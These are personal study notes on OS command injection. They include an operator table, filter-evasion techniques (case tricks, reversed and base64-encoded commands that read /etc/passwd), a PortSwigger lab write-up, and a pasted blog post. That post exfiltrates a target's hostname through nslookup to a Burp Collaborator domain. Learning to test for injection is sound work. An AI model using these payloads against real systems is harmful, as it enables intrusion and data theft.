# intro

- we are going to talk about command injection
    
    ### definition:
    
    💡
    
    command injection is ( the excution of system commands on the back end host server ) so it is very critical .
    
    - note:
        
        if the system uses the input in the system commands we will be able to payload a script in there to execute the intended command.
        

- what are injection ?
    
    injection is simply when the user input is misundrstood as a piece of the WA and get used in there for malliciouse activity .
    
    - types of injections :
        
        |   |   |
        |---|---|
        |injection|description|
        |os command injection|input → used as OS command|
        |code injection|input → used as code inside function|
        |SQLi|input → used as a part of sql query|
        |XSS && html injection|input → displayed on a web page without sanitization|
        
        There are many other types of injections other than the above, like `LDAP injection`, `NoSQL Injection`, `HTTP Header Injection`, `XPath Injection`, `IMAP Injection`, `ORM Injection`, and others.
        

## Exploitation

### detection

|   |   |   |   |
|---|---|---|---|
|**Injection Operator**|**Injection Character**|**URL-Encoded Character**|**Executed Command**|
|Semicolon|`;`|`%3b`|Both|
|New Line|`\n`|`%0a`|Both|
|Background|`&`|`%26`|Both (second output generally shown first)|
|Pipe|`\|`|`%7c`|Both (only second output is shown)|
|AND|`&&`|`%26%26`|Both (only if first succeeds)|
|OR|`\|`|`%7c%7c`|Second (only if first fails)|
|Sub-Shell|` `` `|`%60%60`|Both (Linux-only)|
|Sub-Shell|`$()`|`%24%28%29`|Both (Linux-only)|

We can use any of these operators to inject another command so `both` or `either` of the commands get executed. `We would write our expected input (e.g., an IP), then use any of the above operators, and then write our new command`

### Injecting commands

  

### Other injection operators

## Filter Evasion

### identifying filters

💡

This section will look at a few examples of how command injections may be detected and blocked and how we can identify what is being blocked.

  

### bypassing space filters

### Bypassing Other blacklisted characters

- from the common blacklisted characters are ( / \ they are both slash and back slash they are both blacklisted in the most common situation ).
- Linux:
    

  

### bypassing blacklisted commands

### Advanced command obfuscation

<harding the detection of injected command >  

### case manipulation:

- big or small letters.
- whoAMI
- there is a command that transfers from to
    
      
    
    ```
    $   $(tr "[A-Z]" "[a,z]" <<<"whOAmI")
    ```
    

### reversed commands ;

- typing a template that switches the obfuscated command back to their normal shape like if we types a command in a reversed letters way and then using another command in linux to rev it
    
    ```
    	echo 'whoami' | rev 
    output:    imaohw
    ```
    

- right now we prepared our obfuscated command lets see how we will reverse it in our command
    
    ```
    $(rev<<<'here we right the command to deopfuscate via reversing')
    the $() is called sub-shell 
    $(rev<<<'imaohw')
    ```
    

### encoded commands :

```
KareemAlsadeq@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```

```
KareemAlsadeq@htb[/htb]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

Tip: Note that we are using `<<<` to avoid using a pipe `|`, which is a filtered character.

```
ip=27.110.10.3%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDEg)
```

so we did it via bash<<<$()

  

  

### evasion tools

## Prevention

### command injection prevention

  

- imp_things
    
      
    
    |   |   |
    |---|---|
    |**Injection Type**|**Operators**|
    |SQL Injection|`'` `,` `;` `--` `/* */`|
    |Command Injection|`;` `&&`|
    |LDAP Injection|`*` `(` `)` `&` `\|`|
    |XPath Injection|`'` `or` `and` `not` `substring` `concat` `count`|
    |OS Command Injection|`;` `&` `\|`|
    |Code Injection|`'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`|
    |Directory Traversal/File Path Traversal|`../` `..\\` `%00`|
    |Object Injection|`;` `&` `\|`|
    |XQuery Injection|`'` `;` `--` `/* */`|
    |Shellcode Injection|`\x` `\u` `%u` `%n`|
    |Header Injection|`\n` `\r\n` `\t` `%0d` `%0a` `%09`|
    
    127.0.0.1 \n whoami
    
    ip=127.0.0.1%0a {ls,-lah}
    
    ip=127.0.0.1%0a {ls,${PATH:0:1}home}
    

  

- CTF_info:
    
    - **Blind OS** [**command injection**](https://portswigger.net/web-security/os-command-injection) **with output redirection**
        - okay the target was to simply use the feedback submit email’s input field to put an os command injection but the output dont come in the response so we needed to first test if the injection is in the place or not by useing x||sleep+10||
        - and by that the response took 10 seconds to come up in the repeater now we made sure from the vulnerability present so we went to the home page and we opened any of the pages that are mentioned on it they all contained images and the imgs are refered to be played so this means we have access to /var/www/images so all what we did was to use the os command to print the output of whoami in a file that is placed in /var/www/images/who.txt yeah that is the name of the file we did that via the > simpole to automate the whole thing and then we went back the page and in the image field via the inspector we found the name of the file ( image ) that it was playing is 70.jpg so we chagned it to who.txt and it displayed as a broken img and we clicked to open it via right click in a new tab and we used view source code for the newtab img to see the result of our command ;)
    - **Blind OS command injection with out-of-band interaction**
        
          
        
        # Blind Command Injection Testing with Burp Collaborator
        
        **By Brian S**
        
        In this post we will demonstrate how Burp Collaborator can be  
        leveraged for detecting and exploiting blind command injection  
        vulnerabilities.
        
        Burp Collaborator is an excellent tool provided by Portswigger in  
        BurpSuite Pro to help induce and detect external service interactions.  
        These external service interactions occur when an application or system  
        performs an action which interacts with another system or service…eazy  
        peezy. An example of an external interaction is DNS lookups. If you  
        provide a hostname to a service, and it resolves that hostname, an  
        external service interaction has likely occurred.
        
        While Burp Collaborator has many use cases, today we’ll explore a  
        specific use case — detecting and exploiting blind command injections.
        
        Command injection vulnerabilities occur when user-controllable data  
        is processed by a shell command interpreter — the information you  
        submitted to the application was used as part of a command run directly  
        by the system.
        
        Command injection vulnerabilities are serious findings, as they allow  
        an attacker to execute commands on the underlying system hosting the  
        web application.
        
        Let’s take a look at how Burp Collaborator could be used to help us  
        detect and exploit the more difficult form of command injection  
        vulnerabilities, blind command injections.
        
        In blind command injection, we don’t see any output from our  
        injection attacks, even though the command is running behind the scenes.  
        We generally see detection performed via payloads which cause the  
        system to perform a noticeable action like sleep (time-based), or  
        perhaps ping another server under our control.
        
        _Sleep Command Injected – Response Time Observed_
        
        [![](https://threat.tevora.com/content/images/2018/05/blind_os_sleep.png)](https://threat.tevora.com/content/images/2018/05/blind_os_sleep.png)
        
        [![](https://www.tevora.com/wp-content/uploads/2018/05/blind_os_sleep-1024x361.png)](https://www.tevora.com/wp-content/uploads/2018/05/blind_os_sleep-1024x361.png)
        
        _Ping Command Injected_
        
        [![](https://threat.tevora.com/content/images/2018/05/ping-1.png)](https://threat.tevora.com/content/images/2018/05/ping-1.png)
        
        [![](https://www.tevora.com/wp-content/uploads/2018/05/ping-1.png)](https://www.tevora.com/wp-content/uploads/2018/05/ping-1.png)
        
        _Ping Response Observed_
        
        [![](https://threat.tevora.com/content/images/2018/05/ping-2.png)](https://threat.tevora.com/content/images/2018/05/ping-2.png)
        
        [![](https://www.tevora.com/wp-content/uploads/2018/05/ping-2.png)](https://www.tevora.com/wp-content/uploads/2018/05/ping-2.png)
        
        With Burp Collaborator, we can often use its DNS service interaction  
        to find these vulnerabilities a bit more easily. We’re likely already  
        using BurpSuite to assess the application, so it makes sense to leverage  
        Collaborator.
        
        If we can induce our target to perform an external service  
        interaction via a command injection, we can use Collaborator to confirm  
        it.
        
        So you think you have a shot at blind command injection? Start up the Collaborator client!
        
        [![](https://www.tevora.com/wp-content/uploads/2018/05/start_collaborator.png)](https://www.tevora.com/wp-content/uploads/2018/05/start_collaborator.png)
        
        Grab a Collaborator payload by copying it to your clipboard:
        
        [![](https://threat.tevora.com/content/images/2018/05/collaborator-copy-to-clipboard.png)](https://threat.tevora.com/content/images/2018/05/collaborator-copy-to-clipboard.png)
        
        [![](https://www.tevora.com/wp-content/uploads/2018/05/collaborator-copy-to-clipboard.png)](https://www.tevora.com/wp-content/uploads/2018/05/collaborator-copy-to-clipboard.png)
        
        It will look something like this:
        
        `255g0p3vslus8dt7w02tj4cj8ae22r.burpcollaborator.net`
        
        Fun fact: the nslookup command uses similar syntax on Windows and  
        Linux, making it a perfect candidate for cross-platform blind command  
        injection tests. Just insert `nslookup $collaborator-payload` into your usual test cases. If a DNS lookup is performed on your payload, you’ll be notified by Collaborator.
        
        Let’s drop a Collaborator payload into our example injection…
        
        Here’s the payload:
        
        `8.8.8.8;nslookup 255g0p3vslus8dt7w02tj4cj8ae22r.burpcollaborator.net`
        
        The only output we see from the web application is “Test passed.”
        
        [![](https://threat.tevora.com/content/images/2018/05/collaborator-payload-ui-1.png)](https://threat.tevora.com/content/images/2018/05/collaborator-payload-ui-1.png)
        
        [![](https://www.tevora.com/wp-content/uploads/2018/05/collaborator-payload-ui-1.png)](https://www.tevora.com/wp-content/uploads/2018/05/collaborator-payload-ui-1.png)
        
        But we see the response to our injection received by the Collaborator client, confirming we have command execution.
        
        [![](https://threat.tevora.com/content/images/2018/05/collaborator-interaction.png)](https://threat.tevora.com/content/images/2018/05/collaborator-interaction.png)
        
        [![](https://www.tevora.com/wp-content/uploads/2018/05/collaborator-interaction.png)](https://www.tevora.com/wp-content/uploads/2018/05/collaborator-interaction.png)
        
        Awesome.
        
        Let’s take it a step further. What if we wanted to exfiltrate some  
        data? Perhaps we’re unable to gain a shell from our injection attempts,  
        and we need to figure out why — or we just want a better proof of  
        concept for our report.
        
        Collaborator gives us a really simple and effective option for this,  
        without leaving BurpSuite to setup additional tools during a test.
        
        We can use Collaborator to pull back some details about the target by  
        appending system data to the beginning of the DNS lookup. Collaborator  
        will accept lookups to any subdomain requested on the payload (keeping  
        in mind 63 character limits for subdomains, and 253 character limits for  
        the overall DNS lookup).
        
        Let’s pull back the hostname of our target system.
        
        Here’s the payload:
        
        `8.8.8.8;nslookup $(hostname).255g0p3vslus8dt7w02tj4cj8ae22r.burpcollaborator.net`
        
        [![](https://www.tevora.com/wp-content/uploads/2018/05/hostname-payload.png)](https://www.tevora.com/wp-content/uploads/2018/05/hostname-payload.png)
        
        Excellent, we’ve retrieved the hostname from our target through DNS  
        exfiltration. With a little imagination we can bring back all sorts of  
        informative details.
        
        **A note on security: don’t send sensitive data back over a DNS channel without securing it.**
        
        In addition, you can read about the security of the Collaborator  
        service provided by Portswigger in their documentation, or you can spin  
        up your own private Collaborator server to use internally.
        
        Resources
        
        [Burp Collaborator Documentation](https://portswigger.net/burp/help/collaborator)
        
        [OWASP Testing for Command Injections](http://www.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013))
        
        [Hackerone Command Injection How-To](https://www.hackerone.com/blog/how-to-command-injections)
        
        [Contextis Data Exfiltration via Blind OS Command Injection](https://www.contextis.com/blog/data-exfiltration-via-blind-os-command-injection)